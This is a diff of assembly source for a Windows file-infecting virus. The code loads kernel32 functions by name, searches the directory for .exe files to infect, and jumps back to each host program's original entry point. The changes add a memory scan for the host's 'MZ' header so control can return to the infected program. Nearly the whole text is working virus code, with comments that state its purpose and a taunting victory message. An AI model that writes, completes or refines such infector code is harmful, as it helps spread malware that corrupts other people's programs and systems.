@@ -17,7 +17,7 @@ begin_copy:
 ; DATA (inside .code section)
 ; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
 
-    oldEntryPoint           dd end_copy
+    oldEntryPoint           dd 0
     msgOfVictory            db "H4 h4 h4, J3 5u15 1 H4CK3R !!!", 0
 
     kernel32_dll_name       db "Kernel32.dll", 0
@@ -27,8 +27,8 @@ begin_copy:
 
 	file_regex				db "*.exe", 0
 
-	dbg_sysfail				db "A system function failed", 0	; DEBUG
-	dbg_infectfail			db "Problem with an exe file", 0	; DEBUG
+	; dbg_sysfail				db "A system function failed", 0	; DEBUG
+	; dbg_infectfail			db "Problem with an exe file", 0	; DEBUG
 
 ; Function names
 	closehandle_name		db "CloseHandle", 0
@@ -41,6 +41,7 @@ begin_copy:
 	readfile_name			db "ReadFile", 0
 	setfilepointer_name		db "SetFilePointer", 0
     virtualalloc_name       db "VirtualAlloc", 0
+	virtualfree_name		db "VirtualFree", 0
 	writefile_name			db "WriteFile", 0
 
 ; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
@@ -93,6 +94,7 @@ main PROC NEAR
 	LOCAL	readfile_addr:DWORD
 	LOCAL	setfilepointer_addr:DWORD
 	LOCAL	virtualalloc_addr:DWORD
+	LOCAL	virtualfree_addr:DWORD
 	LOCAL	writefile_addr:DWORD
 
     call    delta_offset				; Get delta offset for position independence.
@@ -127,6 +129,7 @@ ENDM
 	LOADFUNC	readfile_name,		kernel32_dll_name,	readfile_addr
 	LOADFUNC	setfilepointer_name,kernel32_dll_name,	setfilepointer_addr
 	LOADFUNC	virtualalloc_name,	kernel32_dll_name,	virtualalloc_addr
+	LOADFUNC	virtualfree_name,	kernel32_dll_name,	virtualfree_addr
 	LOADFUNC	writefile_name,		kernel32_dll_name,	writefile_addr
 
 ; functions loading end.
@@ -140,15 +143,32 @@ ENDM
 
 ; --------------------------------------> Now, time to infect the other files ! Niark niark niark...
 
-include	search_files.asm							; Loop for searching and infecting all exe files in the directory.
+include	search_files.asm	; Loop for searching and infecting all exe files in the directory.
 
-	mov		ecx, [ebx + oldEntryPoint]	;
+	mov		ecx, [ebx + oldEntryPoint]	; Load the old entry point RVA.
+	cmp		ecx, 0
+	je		exit						; oldEntryPoint = 0 <=> it is the seed file and there is nowhere to jump after.
+
+	call	search_imgbase_get_eip
+search_imgbase_get_eip:
+	pop		esi							; esi -> somewhere inside our program (here).
+    and     esi, 0FFFF0000h             ; mask address inside our program to get page aligned like sections.
+    cmp     word ptr [esi], "ZM"
+	je		search_imgbase_end
+search_imgbase:
+    sub     esi, 01000h					; Going back and back, keeping the page/section alignment.
+    cmp     word ptr [esi], "ZM"        ; Looking for the "MZ" signature of a DOS header. "ZM" for endianess.
+    jne     search_imgbase
+search_imgbase_end:
+	add		esi, ecx					; add real ImgBase to oldEntryPoint RVA to make a VA.
+
 	leave								; Epilogue. Because of the jmp, the epilogue of the current procedure will never be executed, therefore this one is here.
-	jmp		ecx							; Jump to currently executed infected file's original entry. If it is the virus seed, it is just a jump to end_copy.
-
-main ENDP
+	jmp		esi							; Jump to currently executed infected file's original entry. If it is the virus seed, it is just a jump to end_copy.
 
 exit:
+	ret
+main ENDP
+
 end_copy:
 	ret
 end start
